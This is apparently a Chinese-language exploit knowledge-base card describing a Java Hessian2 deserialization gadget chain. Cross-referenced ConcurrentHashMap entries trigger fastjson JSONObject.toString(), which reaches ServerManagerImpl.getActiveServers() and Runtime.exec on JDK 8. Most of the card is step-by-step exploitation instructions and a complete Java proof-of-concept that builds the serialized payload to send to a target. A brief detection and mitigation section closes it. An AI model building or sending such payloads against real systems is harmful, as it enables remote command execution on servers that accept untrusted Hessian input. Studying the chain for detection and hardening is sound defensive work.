---
id: web-java-deser-hessian-concurrenthashmap-servermanager-exec
title: Hessian + ConcurrentHashMap 交叉 MapEntry 触发 ServerManagerImpl 执行命令
type: scenario
domain: web
path: web/java/deserialization/hessian
technique: hessian-concurrenthashmap-entry-servermanager-chain
aliases:
- Black2025 JDD Hessian 链
- ServerManagerImpl getActiveServers 链
- Hessian ConcurrentHashMap MapEntry 链
- AudioFileFormat Type 触发 toString
- XStringForChars Hessian 链
tags:
- java
- hessian
- deserialization
- concurrenthashmap
- servermanagerimpl
- jdk-only
- tostring
- rce
cve: []
severity: critical
confidence: high
status: verified
created: '2026-11-05'
updated: '2026-11-05'
verification:
  verified_by: verifier-V11
  verified_at: '2026-11-05T01:22:15+08:00'
  notes: 已对照原文及5张图核对：ServerManagerImpl#getActiveServers→ServerTableEntry.isValid→activate→Runtime.exec(activationCmd) sink 源码、state=2/已退出 process/activationCmd 字段赋值、JSONObject getter 包装、两个交叉 MapEntry + ConcurrentHashMap Node/table/sizeCtl 构造、Hessian2Output setAllowNonSerializable 序列化均与原文代码一致；5张图分别以 AudioFileFormat$Type、AudioFormat$Encoding、XString、XStringForChars、XStringForFSB 弹出计算器，环境为 JDK 8u411。Card 将触发点概括为哈希/等值比较调用 toString（与关联卡 equals→toString 机制一致）。PoC 未在本机执行。
---

## 一句话结论

Hessian2 反序列化一个精心构造的 `ConcurrentHashMap`，用两个交叉引用的 `ConcurrentHashMap$MapEntry` 让哈希/等值比较调用 `JSONObject.toString()`，后者序列化 `ServerManagerImpl` 时调用 getter `getActiveServers()`，经 `ServerTableEntry.isValid()` 进入 `activate()` 的 `Runtime.exec(activationCmd)`，在仅依赖 JDK 8 的环境实现命令执行。

## 原理

- Sink：`com.sun.corba.se.impl.activation.ServerManagerImpl#getActiveServers()` 遍历 `serverTable`，对每个 `ServerTableEntry` 调用 `isValid()`；`isValid()` 在 `state == ACTIVATED` 且进程已退出（`process.exitValue()` 成功）时调用 `activate()`；`activate()` 执行 `process = Runtime.getRuntime().exec(activationCmd)`。
- 构造 sink 所需字段：`serverManager.serverTable` 为 `HashMap<Integer, ServerTableEntry>`；该 entry 的 `state = 2 (ACTIVATED)`、`activationCmd = "calc"`、`process` 设为一个已经退出的进程（如 `new ProcessBuilder("cmd","/c","exit").start()`）。若 process 仍在运行，`exitValue()` 抛 `IllegalThreadStateException`，`isValid()` 直接返回 true，不会走到 `activate()`。
- 触发 getter：把 `serverManager` 放进 `com.alibaba.fastjson.JSONObject` 的 value（`jsonObject.put("key", serverManager)`）。`JSONObject.toString()` 序列化该 value 时会调用其 getter，从而进入 `getActiveServers()`。
- 触发 toString：构造两个 `ConcurrentHashMap$MapEntry` 并交叉引用——`entry1.key = toStringGadget`、`entry1.val = jsonObject`；`entry2.key = jsonObject`、`entry2.val = toStringGadget`。把这两个 entry 作为 `ConcurrentHashMap` 的两个 Node（`table` 数组、`sizeCtl=2`）序列化；反序列化时 Map 的哈希/等值比较会调用 `jsonObject` 的 `toString()`，进而触发上述 getter。
- 可用的 `toStringGadget`：`javax.sound.sampled.AudioFileFormat$Type`、`javax.sound.sampled.AudioFormat$Encoding`、`com.sun.org.apache.xpath.internal.objects.XString`、`XStringForChars`、`XStringForFSB` 等 JDK 内置类。
- 之所以成立：哈希容器在恢复 entry 时必须比较 key 的哈希与相等性，这条自动路径把“数据”带到了 `toString`/getter；而 JDK 自带的 CORBA 激活组件把 getter 直接连到 `Runtime.exec`。
- 环境依赖：`com.sun.corba.se.impl.activation` 属于 JDK 8 的 CORBA 实现，JDK 11+ 已移除；原文实测于 JDK 8u411。

## 触发条件

- 目标存在可控的 Hessian/Hessian2 反序列化入口；
- 运行环境为仍含 CORBA `ServerManagerImpl`/`ServerTableEntry` 的 JDK（如 JDK 8）；
- classpath 含 fastjson（提供 `JSONObject`）或等价的、序列化时会调用 getter 的 JSON 包装类；
- 目标未对 `ServerManagerImpl`、`ConcurrentHashMap$MapEntry`、`JSONObject`、`XString*` 等类做反序列化白名单限制；
- Hessian 反序列化未启用严格类允许列表。

## 利用步骤

1. 反射实例化 `ServerManagerImpl` 与 `ServerTableEntry`（避开构造方法）。
2. 构造 `HashMap<Integer, ServerTableEntry>` 并放入 entry；设置 `serverTable`、`state=2`、`activationCmd="calc"`、`process` 为一个已退出的进程。
3. 新建 `JSONObject`，`put("key", serverManager)`，作为 getter 触发载体。
4. 反射创建两个 `ConcurrentHashMap$MapEntry`，按交叉方式设置 key/val（一个 key 为 toString gadget、val 为 JSONObject；另一个相反）。
5. 创建 `ConcurrentHashMap`，设置 `sizeCtl=2`，用 `ConcurrentHashMap$Node` 构造两个节点放入 `table` 数组。
6. 用 `Hessian2Output`（`setAllowNonSerializable(true)`）序列化该 ConcurrentHashMap，发送到目标；反序列化时触发链执行命令。

## PoC

```java
ServerManagerImpl mgr = (ServerManagerImpl) ReflectUtil.newInstance(ServerManagerImpl.class, new Class[]{}, new Object[]{});
HashMap<Integer, ServerTableEntry> table = new HashMap<>();
ServerTableEntry entry = (ServerTableEntry) ReflectUtil.newInstance(ServerTableEntry.class, new Class[]{}, new Object[]{});
table.put(1, entry);

Process p = new ProcessBuilder("cmd", "/c", "exit").start(); // 让 exitValue() 可返回
ReflectUtil.setFieldValue(mgr, "serverTable", table);
ReflectUtil.setFieldValue(entry, "state", 2);                 // ACTIVATED
ReflectUtil.setFieldValue(entry, "process", p);
ReflectUtil.setFieldValue(entry, "activationCmd", "calc");

JSONObject json = new JSONObject();
json.put("key", mgr);                                          // 序列化时调用 getActiveServers()

Object gadget = ReflectUtil.newInstance(
        Class.forName("javax.sound.sampled.AudioFileFormat$Type"), new Class[]{}, new Object[]{});
Object e1 = ReflectUtil.newInstance(Class.forName("java.util.concurrent.ConcurrentHashMap$MapEntry"), new Class[]{}, new Object[]{});
Object e2 = ReflectUtil.newInstance(Class.forName("java.util.concurrent.ConcurrentHashMap$MapEntry"), new Class[]{}, new Object[]{});
ReflectUtil.setFieldValue(e1, "key", gadget);
ReflectUtil.setFieldValue(e1, "val", json);
ReflectUtil.setFieldValue(e2, "key", json);
ReflectUtil.setFieldValue(e2, "val", gadget);

ConcurrentHashMap map = new ConcurrentHashMap();
ReflectUtil.setFieldValue(map, "sizeCtl", 2);
Class<?> nodeC = Class.forName("java.util.concurrent.ConcurrentHashMap$Node");
Constructor<?> nc = nodeC.getDeclaredConstructor(int.class, Object.class, Object.class, nodeC);
nc.setAccessible(true);
Object[] nodes = (Object[]) Array.newInstance(nodeC, 2);
nodes[0] = nc.newInstance(0, e1, e1, null);
nodes[1] = nc.newInstance(0, e2, e2, null);
ReflectUtil.setFieldValue(map, "table", nodes);

ByteArrayOutputStream baos = new ByteArrayOutputStream();
Hessian2Output out = new Hessian2Output(baos);
SerializerFactory sf = new SerializerFactory();
sf.setAllowNonSerializable(true);
out.setSerializerFactory(sf);
out.writeObject(map);
out.flush();
// 将 baos.toByteArray() 作为 Hessian2 请求体发送
```

## 变体与关联

- toString gadget 变体：`AudioFileFormat$Type`、`AudioFormat$Encoding`、`XString`、`XStringForChars`、`XStringForFSB`；原文称同类可枚举出大量组合。
- getter 包装变体：除 fastjson `JSONObject` 外，Jackson 等“序列化对象时调用 getter”的包装也可用。
- 触发容器变体：`ConcurrentHashMap` 的 Node/MapEntry 交叉引用；核心是让哈希/等值比较自动调用到 `toString`。
- 关联：[[web-java-deser-hessian-jdk-only-proxylazyvalue-chain]]（同属 Hessian JDK-only sink 清单，已列出 ServerManagerImpl）；[[web-java-deser-hessian-deserialization-entry-map-put]]（Hessian map.put 入口）。
- 影响边界：只需 JDK 8 + fastjson，无需出网或第三方 gadget；JDK 11+ 因 CORBA 移除而失效。

## 检测与防御

- 检测：Hessian 流中出现 `com.sun.corba.se.impl.activation.ServerManagerImpl`、`ServerTableEntry`、`ConcurrentHashMap$MapEntry`、`com.alibaba.fastjson.JSONObject`、`XStringFor*` 等类名；反序列化后 JVM 派生子进程执行 `calc`/`cmd`；`getActiveServers` 附近的反射字段写入。
- 修复：Hessian 入口启用严格类允许列表，拒绝 `ServerManagerImpl`、`ServerTableEntry`、`MapEntry`、`JSONObject` 等非业务类；不要对不可信数据反序列化。
- 缓解：升级到移除 CORBA 的 JDK 11+；开启 JEP 290 序列化过滤器；限制 Hessian 入口访问来源与鉴权。
